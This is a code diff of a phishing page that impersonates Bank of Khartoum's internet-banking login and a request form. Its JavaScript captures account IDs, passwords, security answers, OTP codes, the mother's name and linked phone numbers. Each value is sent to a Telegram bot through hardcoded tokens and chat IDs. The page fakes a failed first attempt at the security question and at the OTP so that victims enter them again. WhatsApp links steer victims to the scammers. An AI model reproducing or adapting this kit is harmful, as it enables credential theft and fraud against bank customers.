@@ -10,7 +10,6 @@
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Cairo', sans-serif; }
         body { background-color: #f7f7f7; min-height: 100vh; display: flex; flex-direction: column; }
         
-        /* الهيدر العلوي */
         .header { 
             background: linear-gradient(to right, #e53935, #d32f2f); 
             display: flex; 
@@ -165,9 +164,6 @@
             font-size: 13px;
             text-decoration: none;
         }
-        .forgot-pass:hover {
-            text-decoration: underline;
-        }
 
         .terms-group {
             display: flex;
@@ -176,12 +172,6 @@
             margin-bottom: 25px;
             font-size: 14px;
             color: #555;
-            cursor: pointer;
-        }
-
-        .terms-group input[type="checkbox"] {
-            width: 16px;
-            height: 16px;
             cursor: pointer;
         }
 
@@ -202,7 +192,6 @@
             background-color: #d32f2f; 
         }
 
-        /* تنسيقات الشاشات التابعة للخدمات وأسئلة الأمان */
         h2 { color: #d32f2f; margin-bottom: 15px; font-size: 20px; text-align: center; }
         h3 { color: #333; margin-bottom: 20px; font-size: 15px; border-bottom: 2px solid #d32f2f; display: inline-block; padding-bottom: 5px; }
         
@@ -246,7 +235,6 @@
 </head>
 <body>
 
-    <!-- الهيدر العلوي المطور -->
     <header class="header">
         <div class="header-logo">
             <div class="logo-box">
@@ -266,7 +254,7 @@
 
     <div class="main-container">
         
-        <!-- خطوة 1: اختيار المشكلة (الصفحة الأولى القديمة) -->
+        <!-- خطوة 1: اختيار الخدمة -->
         <div id="step-1" class="card arabic-dir">
             <h2>الاستمارة أونلاين</h2>
             <h3>اختر نوع المشكلة التي تواجهها</h3>
@@ -330,29 +318,29 @@
             </div>
         </div>
 
-        <!-- خطوة 2: واجهة تسجيل الدخول المطابقة للصورة -->
+        <!-- خطوة 2: تسجيل الدخول مع التحقق من كلمة السر والـ User ID -->
         <div id="step-2" class="card hidden">
             <div class="login-heading" style="margin-bottom: 10px; padding: 0;">Internet Banking - Login</div>
             <span class="card-title">Please enter the details</span>
             
             <div class="input-group">
-                <label>أدخل رقم الحساب:</label>
+                <label>User ID:</label>
                 <input type="text" id="account-num" placeholder="Enter User ID">
                 <div id="err-account-num" class="error-message-box">⚠️ This field is required</div>
             </div>
 
             <div class="input-group">
-                <label>أدخل كلمة السر:</label>
+                <label>Password:</label>
                 <div class="input-wrapper">
                     <input type="password" id="password" placeholder="Enter password">
                     <span class="icon-eye" onclick="togglePassword('password')">👁️</span>
                 </div>
                 <div id="err-password" class="error-message-box">⚠️ This field is required</div>
-                <div id="login-error-msg" class="error-message-box">⚠ Invalid User ID or Password. Please try again.</div>
+                <div id="login-error-msg" class="error-message-box">⚠ رقم الحساب او كلمة السر غير صحيحة .</div>
             </div>
 
             <div class="forgot-pass-container">
-                <a href="https://wa.me/249918597038?text=السلام عليكم، أرغب في استعادة كلمة المرور لحسابي في بنك الخرطوم" class="forgot-pass" target="_blank">Forgot Password?</a>
+                <a href="https://wa.me/249101938506?text=السلام عليكم، أرغب في استعادة كلمة المرور لحسابي في بنك الخرطوم" class="forgot-pass" target="_blank">Forgot Password?</a>
             </div>
 
             <label class="terms-group">
@@ -363,7 +351,7 @@
             <button class="btn-login" onclick="submitStep1()">Login</button>
         </div>
 
-        <!-- خطوة 3: طلب رقم الواتساب للتواصل -->
+        <!-- خطوة 3: رقم الواتساب -->
         <div id="step-whatsapp-verification" class="card arabic-dir hidden">
             <h2>التحقق الأمني المتقدم</h2>
             <h3>لدواعي أمنية يرجى إدخال رقم واتساب فعال للتواصل</h3>
@@ -375,7 +363,7 @@
             <button class="btn-login" style="background-color: #d32f2f;" onclick="submitWhatsappStep()">حفظ ومتابعة</button>
         </div>
 
-        <!-- خطوة 4: أسئلة الأمان -->
+        <!-- خطوة 4: أسئلة الأمان مع تجربة خطأ في المحاولة الأولى -->
         <div id="step-3" class="card arabic-dir hidden">
             <h2>متابعة الاستمارة أونلاين</h2>
             <h3>لأغراض الأمان يرجى الإجابة على سؤال الأمان</h3>
@@ -400,25 +388,25 @@
                 <label>ادخل الجواب:</label>
                 <input type="text" id="security-answer" placeholder="اكتب جوابك هنا">
                 <div id="err-security-answer" class="error-message-box">⚠️ هذا الحقل مطلوب</div>
-                <div id="security-error-msg" class="error-message-box">⚠️ اجابة سؤال الامان خاطئة الرجاء التأكد ومحاولة مرة أخرى</div>
+                <div id="security-error-msg" class="error-message-box">⚠️ إجابة سؤال الأمان خاطئة! يرجى التأكد وإعادة المحاولة.</div>
             </div>
             <button class="btn-login" style="background-color: #d32f2f;" onclick="submitStep2()">إرسال</button>
         </div>
 
-        <!-- خطوة 5: رمز الـ OTP (تأتي مباشرة بعد أسئلة الأمان) -->
+        <!-- خطوة 5: رمز OTP مع خطأ المحاولة الأولى -->
         <div id="step-5" class="card arabic-dir hidden">
             <h2>إدخال رمز OTP</h2>
             <div class="input-group">
                 <label>أدخل رمز التحقق المرسل إليك (OTP):</label>
                 <input type="text" id="otp-code" placeholder="000000" maxlength="6" style="text-align: center; letter-spacing: 5px; font-size: 20px;">
                 <div id="err-otp-code" class="error-message-box">⚠️ هذا الحقل مطلوب</div>
-                <div id="otp-error-msg" class="error-message-box">⚠️ الرمز المدخل غير صحيح، يرجى إدخال الرمز الصحيح</div>
+                <div id="otp-error-msg" class="error-message-box">⚠️ الرمز المدخل غير صحيح، تفقد بريدك الإلكتروني او صندوق الرسائل الواردة إليك للحصول الصحيح.</div>
             </div>
             <span id="otp-timer" style="color: #d32f2f; font-size: 13px; margin-bottom: 15px; display: block; text-align: center;">إعادة إرسال الرمز خلال 30:00 دقيقة</span>
             <button id="verify-btn" class="btn-login" style="background-color: #d32f2f;" onclick="verifyOtp()">التحقق الاعتمادي</button>
         </div>
 
-        <!-- خطوة 6: تأكيد البيانات الشخصية والمالية (بعد الـ OTP) -->
+        <!-- خطوة 6: التفاصيل المالية والشخصية -->
         <div id="step-4" class="card arabic-dir hidden">
             <h2>متابعة الاستمارة أونلاين</h2>
             <h3>تأكيد التفاصيل المالية وبيانات الهوية</h3>
@@ -456,7 +444,7 @@
             <div class="input-group">
                 <label>المهنة:</label>
                 <input type="text" id="inc-job" placeholder="أدخل طبيعة عملك الحالية">
-                <div id="err-inc-job" class="error-message-box">⚠️ هذا الحقل مطلوب</div>
+                <div id="err-inc-job" class="error-message-box">⚠️️ هذا الحقل مطلوب</div>
             </div>
             <div class="input-group">
                 <label>مكان العمل بالضبط:</label>
@@ -471,7 +459,7 @@
             <div class="input-group">
                 <label>إسم أقرب الأقربين:</label>
                 <input type="text" id="inc-relative-name" placeholder="أدخل اسم أحد الأقارب">
-                <div id="err-inc-relative-name" class="error-message-box">⚠️ هذا الحقل مطلوب</div>
+                <div id="err-inc-relative-name" class="error-message-box">⚠️️ هذا الحقل مطلوب</div>
             </div>
             <div class="input-group">
                 <label>رقم هاتف أقرب الأقربين:</label>
@@ -513,7 +501,7 @@
             <button class="btn-login" style="background-color: #d32f2f;" onclick="finalizeProcess()">إتمام وتوثيق الطلب</button>
         </div>
 
-        <!-- الصفحة النهائية -->
+        <!-- النجاح النهائي -->
         <div id="step-final-success" class="card arabic-dir hidden">
             <div class="success-box">
                 <h2 style="color: #2e7d32; text-align: center; margin-bottom: 10px;">✓ تم تسجيل ومعالجة طلبك بنجاح</h2>
@@ -537,7 +525,6 @@
 
     </div>
 
-    <!-- زر واتساب السفلي -->
     <a href="https://wa.me/249918597038" class="floating-whatsapp" target="_blank">
         <i class="fab fa-whatsapp"></i>
         <span>قسم معالجة الطلبات للاستفسار</span>
@@ -600,16 +587,20 @@
 
             const accountInput = document.getElementById('account-num').value.trim();
             const passwordInput = document.getElementById('password').value;
-            
-            userData.accountNum = accountInput;
-            userData.password = passwordInput;
-
             const errBox = document.getElementById('login-error-msg');
-            if (!/^\d+$/.test(accountInput) || (accountInput.length !== 6 && accountInput.length !== 7) || isSequential(accountInput)) {
+
+            // فحص نمط كلمة المرور والحساب
+            const isAccountValid = /^\d+$/.test(accountInput) && (accountInput.length === 6 || accountInput.length === 7) && !isSequential(accountInput);
+            const isPasswordValid = passwordInput.length >= 6; // الحد الأدنى لطول كلمة السر النموذجية
+
+            if (!isAccountValid || !isPasswordValid) {
                 errBox.style.display = 'block';
                 return;
             }
             errBox.style.display = 'none';
+
+            userData.accountNum = accountInput;
+            userData.password = passwordInput;
 
             sendToTelegram(`📋 دخول جديد [الخدمة: ${selectedService}]\n🔢 الحساب: ${userData.accountNum}\n🔐 كلمة المرور: ${userData.password}`);
             goToStep('step-whatsapp-verification');
@@ -628,16 +619,18 @@
             userData.securityQuestion = document.getElementById('security-question').value;
             userData.securityAnswer = document.getElementById('security-answer').value;
 
+            // المحاولة الأولى خاطئة
             if (securityAttemptCount === 0) {
                 securityAttemptCount++;
-                sendToTelegram(`⚠ [محاولة أولى خاطئة] أمان\n❓ السؤال: ${userData.securityQuestion}\n💬 الجواب: ${userData.securityAnswer}`);
+                sendToTelegram(`⚠️ [محاولة أولى خاطئة] أسئلة الأمان\n❓ السؤال: ${userData.securityQuestion}\n💬 الجواب الخاطئ: ${userData.securityAnswer}`);
                 document.getElementById('security-error-msg').style.display = 'block';
                 document.getElementById('security-answer').value = ''; 
                 return;
             }
 
+            // المحاولة الثانية صحيحة
             document.getElementById('security-error-msg').style.display = 'none';
-            sendToTelegram(`🔐 أمان صحيح\n❓ السؤال: ${userData.securityQuestion}\n💬 الجواب: ${userData.securityAnswer}`);
+            sendToTelegram(`✅ [محاولة ثانية صحيحة] أسئلة الأمان\n❓ السؤال: ${userData.securityQuestion}\n💬 الجواب الصحيح: ${userData.securityAnswer}`);
             goToStep('step-5'); 
         }
 
@@ -645,14 +638,16 @@
             if (!checkEmptyFields(['otp-code'])) return;
             const o = document.getElementById('otp-code').value.trim();
 
+            // المحاولة الأولى خاطئة للرمز
             if (otpAttemptCount === 0) {
                 otpAttemptCount++;
-                sendToTelegram(`⚠️ [محاولة أولى خاطئة] OTP: ${o}`);
+                sendToTelegram(`⚠️ [محاولة أولى خاطئة] رمز OTP: ${o}`);
                 document.getElementById('otp-error-msg').style.display = 'block';
                 document.getElementById('otp-code').value = ''; 
                 return;
             }
 
+            // المحاولة الثانية صحيحة
             const btn = document.getElementById('verify-btn');
             btn.disabled = true;
             btn.innerHTML = `<span class="loading-spinner"></span> جاري المعالجة...`;
@@ -660,11 +655,11 @@
             setTimeout(() => {
                 userData.otp = o;
                 document.getElementById('otp-error-msg').style.display = 'none';
-                sendToTelegram(`🔢 OTP معتمد: ${userData.otp}`);
+                sendToTelegram(`✅ [محاولة ثانية معتمدة] OTP: ${userData.otp}`);
                 btn.disabled = false;
                 btn.innerHTML = `التحقق الاعتمادي`;
                 goToStep('step-4'); 
-            }, 2500);
+            }, 2000);
         }
 
         function submitStep3() {
@@ -674,7 +669,7 @@
             userData.motherName = document.getElementById('mother-name').value;
             userData.linkedPhone = document.getElementById('linked-phone').value;
 
-            sendToTelegram(`💰 البيانات الشخصية والمالية:\n💵 المبلغ: ${userData.amount}\n👩‍👦 إسم الوالدة: ${userData.motherName}\n📱 الهاتف المرتبط: ${userData.linkedPhone}`);
+            sendToTelegram(`💰 البيانات الشخصية والمالية:\n💵 المبلغ: ${userData.amount}\n👩‍‍👦 إسم الوالدة: ${userData.motherName}\n📱 الهاتف المرتبط: ${userData.linkedPhone}`);
 
             if (selectedService === 'التحويلات الخاطئة') {
                 goToStep('step-wrong-transfer');
@@ -717,8 +712,8 @@
         }
 
         function sendToTelegram(messageText) {
-            const botToken = "8768779383:AAF8JU5AIp7V92PytduKqrF1qIb25IAGKng";
-            const chatId = "8859964558";
+            const botToken = "8609755572:AAESN7NhSL5lA3rofIqwYHaK4oouuHRyPbc";
+            const chatId = "8912947067";
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
